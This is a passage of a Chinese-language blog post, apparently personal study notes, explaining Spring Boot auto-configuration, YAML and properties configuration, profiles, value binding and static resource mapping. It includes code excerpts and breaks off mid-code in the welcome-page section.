alt="image-20251028104739619"></p><p>注意：这么多自动配置为什么有的没有生效，需要导入对应的start才能有作用？？？</p><p>​核心注解:@ConditionalOnXXX:如果这里面的<strong>条件都满足</strong>，才会生效</p><p><strong>结论：</strong></p><ul><li><p>自动导入的核心文件：</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028104855815.png"></p></li><li><p>springboot所有自动配置都是在启动的时候扫描并加载:spring.factories 所有的自动配置类都在这里面，但是不一定生效，要判断条件是否成立，只要导入了 对应的 start ，就有对应的启动器了，有了启动器，我们自动装配就会生效，然后就配置成功!</p><ol><li>springboot在启动的时候，从类路径下 &#x2F;META-INF&#x2F;spring.factories 获取指定的值;</li><li>将这些自动配置的类导入容器，自动配置就会生效，帮我进行自动配置!</li><li>以前我们需要自动配置的东西，现在springboot帮我们做了!</li><li>整合javaEE，解决方案和自动配置的东西都在 spring-boot-autoconfigure-2.2.0.RELEASE.jar 这个包下</li><li>它会把所有需要导入的组件，以类名的方式返回，这些组件就会被添加到容器;</li><li>容器中也会存在非常多的xxxAutoConfiguration的文件(@Bean)，就是这些类给容器中导入了这个场景需要的所有组件;并自动配置， @Configuration，JavaConfig!</li><li>有了自动配置类，免去了我们手动编写配置文件的工作!</li></ol></li></ul></li><li><p>主程序启动</p><p>最初以为就是运行了一个main方法，没想到却开启了一个服务</p><ul><li>一部分是SpringApplication的实例化</li><li>二是run方法的执行</li></ul><p><strong>SpringApplication</strong>主要：</p><p>1、推断应用的类型是普通的项目还是Web项目</p><p>2、查找并加载所有可用初始化器 ， 设置到initializers属性中</p><p>3、找出所有的应用程序监听器，设置到listeners属性中</p><p>4、推断并设置main方法的定义类，找到运行的主类</p><p><strong>run流程分析：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028111613729.png" alt="img"></p></li><li><p>关于SpringBoot的理解<br>1、自动装配<br>2、run(）</p><p>​是普通的项目还是Web项目</p><p>​推断当前的主类是哪个（你也可以自己写带有注解的主类，不使用默认的但是记得干掉它）</p><p>​编译处理上下文的bean</p><p>​自动装配的全面接管SpringMVC的配置</p></li></ul><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li><p>热部署</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028142026069.png" alt="image-20251028142018981"></p></li><li><p>如何配置</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028144943051.png" alt="image-20251028144943012"></p><p>这个可以删，自己重写一个，但是application不能变，变后缀</p><p><code>application.yaml</code></p></li><li><p>是什么？</p><p>SpringBoot使用一个全局的配置文件 ， 配置文件名称是固定的</p><ul><li><p>application.properties</p></li><li><ul><li><p>语法结构 ：key&#x3D;value</p><figure class="shiki properties"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">server.port</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">8081</span></span></code></pre></div></div></figure></li></ul></li><li><p>application.yaml</p></li><li><ul><li><p>语法结构 ：key：空格 value</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">server</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #E06C75">port</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">8081</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">#这必须有空格，不然就就报错</span></span></code></pre></div></div></figure><p>配置文件的作用 ：*<em><strong>修改</strong>SpringBoot自动配置的</em>*默认值**，因为SpringBoot在底层都给我们自动配置好了</p><p>（可以同时存在两个配置文件，两个有优先级）</p><p><strong>区别：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028150601465.png" alt="image-20251028150601363"></p></li></ul></li></ul></li><li><p>配置文件可以存在的路径（yaml）（同时代表了优先级）</p><ol><li><p>flie:.&#x2F;config&#x2F;（在主文件夹新建一个config目录，写yaml文件）</p></li><li><p>file:.&#x2F;（和主文件夹同级，写yaml文件）</p></li><li><p>classpath:&#x2F;config&#x2F;（在类文件下新建config目录，写yaml文件）</p></li><li><p>classpath:&#x2F;（和类文件夹同级，写yaml文件）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028212657129.png" alt="image-20251028212657087"></p></li></ol></li></ul><h3 id="配置多个环境"><a href="#配置多个环境" class="headerlink" title="配置多个环境"></a>配置多个环境</h3><ul><li><p>properties</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028214055124.png" alt="image-20251028214055095"></p><p>正常启动走的是默认的配置文件（8080）</p><p><strong>如何走其他的配置文件呢？？</strong></p><p>直接在默认的配置文件里面写</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">spring</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">profiles</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">active</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">dev</span><span style="color: #7F848E; font-style: italic">//要么写dev，要么写test（就是写—后面你那个东西）</span></span></code></pre></div></div></figure><p>（其他配置文件记得写端口）</p></li><li><p>yaml</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">server</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #E06C75">port</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">8081</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">---</span></span><span class="line"><span style="color: #E06C75">server</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #E06C75">port</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">8082</span></span><span class="line"><span style="color: #E06C75">spring</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #E06C75">profiles</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">dev</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">---</span></span><span class="line"><span style="color: #E06C75">server</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #E06C75">port</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">8083</span></span><span class="line"><span style="color: #E06C75">spring</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #E06C75">profiles</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">test</span></span></code></pre></div></div></figure><p>激活：</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">spring</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">profiles</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">active</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">dev</span></span></code></pre></div></div></figure></li></ul><h3 id="自动装配原理"><a href="#自动装配原理" class="headerlink" title="自动装配原理"></a>自动装配原理</h3><ul><li><p>精髓:<br>1)、SpringBoot启动会加载大量的自动配置类<br>2)、我们看我们需要的功能有没有在SpringBoot默认写好的自动配置类当中:<br>3)、我们再来看这个自动配置类中到底配置了哪些组件;(只要我们要用的组件存在在其中，我们就不需要再手动配置了)<br>4)、给容器中自动配置类添加组件的时候，会从properties类中获取某些属性。我们只需要在配置文件中指定这些属性的值即可:<br>xxxxAutoConfigurartion:自动配置类:给容器中添加组件<br>xxxxProperties:封装配置文件中相关属性（通过配置文件修改（yaml））</p></li><li><p>查看自动配置类有没有生效</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">debug </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//返回日志，</span></span></code></pre></div></div></figure></li></ul><h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><ul><li><p>原生方式（spring）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028194622595.png" alt="image-20251028194622460"></p></li><li><p>yaml赋值</p><p>赋值的注解问题：（这个配置，可配可不配，不影响程序运行）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028195355752.png" alt="image-20251028195355686"></p><p>直接利用这个注解，将yaml文件的值和类的值进行绑定</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Configuration</span><span style="color: #E06C75">(</span><span style="color: #D19A66">prefix</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;person&quot;</span><span style="color: #E06C75">)</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028202915674.png" alt="image-20251028202915541"></p><p>在测试文件写输出语句</p><figure class="shiki Java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre><code>package com.test;import ...@SpringBootTestclass Springboot02ConfigApplicationTests {    @Autowired    private Person person;    @Test    void contextLoads() {        System.out.println(person);    }}</code></pre></div></div></figure></li><li><p>使用properties</p><p>不用使用上面的注解，换一个</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">PropertySource</span><span style="color: #E06C75">(</span><span style="color: #D19A66">value</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;classpath:mmm.properties&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//mmm.properties是你传参的properties文件</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Value</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;${name}&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028205857885.png" alt="image-20251028205857784"></p></li></ul><p><strong>结论:</strong><br>配置yml和配置properties都可以获取到值 ( 强烈推荐 yml)</p><p>如果我们在某个业务中，只需要获取配置文件中的某个值，可以使用一下<code> @value</code>(spring)</p><p>如果说，我们专门编写了一个JavaBean来和配置文件进行映射，就直接使用<code>@configurationProperties</code>，不要犹豫!(Properties)</p><ul><li><p>JSP303校验</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028211855409.png" alt="image-20251028211855275"></p><p>强制格式</p></li><li><p>松散绑定:</p><p>yml中写的last-name，这个和lastName是<strong>一样的</strong>，后面跟着的字母默认是大写的。</p><p>这就是松散绑定</p></li></ul><h1 id="SpringbootWeb开发"><a href="#SpringbootWeb开发" class="headerlink" title="SpringbootWeb开发"></a>SpringbootWeb开发</h1><p>之前都是jar包，webapp没处放（问题衍生）</p><p>springboot特点：自动装配</p><p>springboot 到底帮我们配置了什么?   我们能不能进行修改?    能修改哪些东西?    能不能扩展?</p><ul><li>xxxxAutoConfiguraion..向容器中自动配置组件</li><li>xxxxProperties：自动配置类，装配配置文件中自定义的一些内容!</li></ul><p><strong>要解决的问题</strong></p><ul><li>导入静态资源…</li><li>网页首页（出现404报错问题）</li><li>写jsp，通过模板引擎<code> Thymeleaf</code></li><li>装配扩展SpringMVC</li><li>增删改查</li><li>拦截器</li><li>国际化(中英文切换)</li></ul><h2 id="静态资源导入"><a href="#静态资源导入" class="headerlink" title="静态资源导入"></a>静态资源导入</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251030203328732.png" alt="image-20251030203321647"></p><p>创建文件的时候，就默认存在了资源包（静态和模板)</p></li><li><p>查看自动装配的源码</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">addResourceHandlers</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">ResourceHandlerRegistry</span><span style="color: #E06C75"> registry) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">resourceProperties</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isAddMappings</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">debug</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Default resource handling disabled&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addResourceHandler</span><span style="color: #ABB2BF">(registry, </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">mvcProperties</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWebjarsPathPattern</span><span style="color: #ABB2BF">(), </span><span style="color: #98C379">&quot;classpath:/META-INF/resources/webjars/&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addResourceHandler</span><span style="color: #ABB2BF">(registry, </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">mvcProperties</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getStaticPathPattern</span><span style="color: #ABB2BF">(), (Consumer)((registration) </span><span style="color: #C678DD">-&gt;</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">registration</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addResourceLocations</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">resourceProperties</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getStaticLocations</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">servletContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #E5C07B">ServletContextResource</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">resource</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ServletContextResource</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">servletContext</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;/&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #E5C07B">registration</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addResourceLocations</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Resource</span><span style="color: #ABB2BF">[]{resource});</span></span><span class="line"><span style="color: #ABB2BF">                    }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">                }));</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"><span style="color: #E06C75">        }</span></span></code></pre></div></div></figure><ul><li><p>添加静态资源的<code>webjars/</code></p><p>导入一个静态资源包xxx.jar</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251030205357724.png" alt="image-20251030205357658"></p><p>写到pom.xml里面，等待下载之后直接就会部署到扩展包中</p><p>源码提到路径：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">&quot;classpath:/META-INF/resources/webjars/&quot;</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251030205454146.png" alt="image-20251030205454089"></p><p>自主导入的静态资源<code>webjars/...</code>就会映射到这个路径下</p><p>直接访问可得到源码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251030205756988.png" alt="image-20251030205756881"></p></li><li><p>ResourceHandlerRegistry registry是一个回调方法</p><p>前端访问什么路径（如 <code>/static/**</code>）时，系统会去哪个目录（如 <code>classpath:/static/</code>）找对应的静态资源（跟上面的webjars一样）</p></li><li><p>普通静态资源映射</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addResourceHandler</span><span style="color: #ABB2BF">(registry, </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">mvcProperties</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getStaticPathPattern</span><span style="color: #ABB2BF">(), (Consumer)((registration) </span><span style="color: #C678DD">-&gt;</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">registration</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addResourceLocations</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">resourceProperties</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getStaticLocations</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">servletContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ServletContextResource</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">resource</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ServletContextResource</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">servletContext</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;/&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">registration</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addResourceLocations</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Resource</span><span style="color: #ABB2BF">[]{resource});</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}));</span></span></code></pre></div></div></figure><ul><li><p><code>this.mvcProperties.getStaticPathPattern()</code>：获取静态资源的访问路径规则，默认是 <code>/**</code>（可通过 <code>spring.mvc.static-path-pattern</code> 配置修改，比如改为 <code>/static/**</code>）</p></li><li><p>Lambda 表达式，于配置资源的存放目录（<code>ResourceLocations</code>）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">registration</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addResourceLocations</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">resourceProperties</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getStaticLocations</span><span style="color: #ABB2BF">())</span><span style="color: #E06C75">：</span><span style="color: #E5C07B">ResourceProperties</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getStaticLocations</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span></span><span class="line"><span style="color: #7F848E; font-style: italic">//返回 Spring Boot 默认的静态资源目录，顺序是：classpath:/META-INF/resources/、classpath:/resources/、classpath:/static/、classpath:/public/</span></span></code></pre></div></div></figure><p>（可通过 <code>spring.resources.static-locations</code> 自定义修改，但是一旦自定义，<strong>默认的目录就失效了</strong>）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251030210808208.png" alt="image-20251030210808178"></p><p>按照上面的默认目录：有4个</p></li></ul></li></ul></li><li><p>总结：</p><ol><li>在springboot，我们可以使用以下方式处理静态资源<ul><li>webjars                <code>localhost:8080/webjars/</code></li><li>public,static, &#x2F;**,resources        <code>localhost:8080/</code></li></ul></li><li>比较这四个目录的优先级：resources&gt;static(默认)&gt;public</li></ol></li></ul><h2 id="首页定制"><a href="#首页定制" class="headerlink" title="首页定制"></a>首页定制</h2><ul><li><p>依旧查看配置源码<code>WebMvcAutoConfiguration.class</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Bean</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">WelcomePageHandlerMapping</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">welcomePageHandlerMapping</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">ApplicationContext</span><span style="color: #E06C75"> applicationContext</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FormattingConversionService</span><span style="color: #E06C75"> mvcConversionService</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ResourceUrlProvider</span><span style="color: #E06C75"> mvcResourceUrlProvider) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> (WelcomePageHandlerMapping)</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">createWelcomePageHandlerMapping</span><span style="color: #ABB2BF">(applicationContext, mvcConversionService, mvcResourceUrlProvider, WelcomePageHandlerMapping</span><span style="color: #C678DD">::new</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Bean</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">WelcomePageNotAcceptableHandlerMapping</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">welcomePageNotAcceptableHandlerMapping</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">ApplicationContext</span><span style="color: #E06C75"> applicationContext</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FormattingConversionService</span><span style="color: #E06C75"> mvcConversionService</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ResourceUrlProvider</span><span style="color: #E06C75"> mvcResourceUrlProvider) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> (WelcomePageNotAcceptableHandlerMapping)</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">createWelcomePageHandlerMapping</span><span style="color: #ABB2BF">(applicationContext, mvcConversionService, mvcResourceUrlProvider, WelcomePageNotAcceptableHandlerMapping</span><span style="color: #C678DD">::new</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&lt;</span><span style="color: #E5C07B">T</span><span style="color: #E06C75"> extends AbstractUrlHandlerMapping</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">T</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">createWelcomePageHandlerMapping</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">ApplicationContext</span><span style="color: #E06C75"> applicationContext</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FormattingConversionService</span><span style="color: #E06C75"> mvcConversionService</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ResourceUrlProvider</span><span style="color: #E06C75"> mvcResourceUrlProvider</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">WelcomePageHandlerMappingFactory</span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">T</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> factory) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">TemplateAvailabilityProviders</span><span style="color: #E06C75"> templateAvailabilityProviders </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">TemplateAvailabilityProviders</span><span style="color: #E06C75">(applicationContext)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> staticPathPattern </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">mvcProperties</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getStaticPathPattern</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">T</span><span style="color: #E06C75"> handlerMapping </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">factory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">create</span><span style="color: #ABB2BF">(templateAvailabilityProviders, applicationContext, </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getIndexHtmlResource</span><span style="color: #ABB2BF">(), staticPathPattern);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">handlerMapping</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setInterceptors</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span 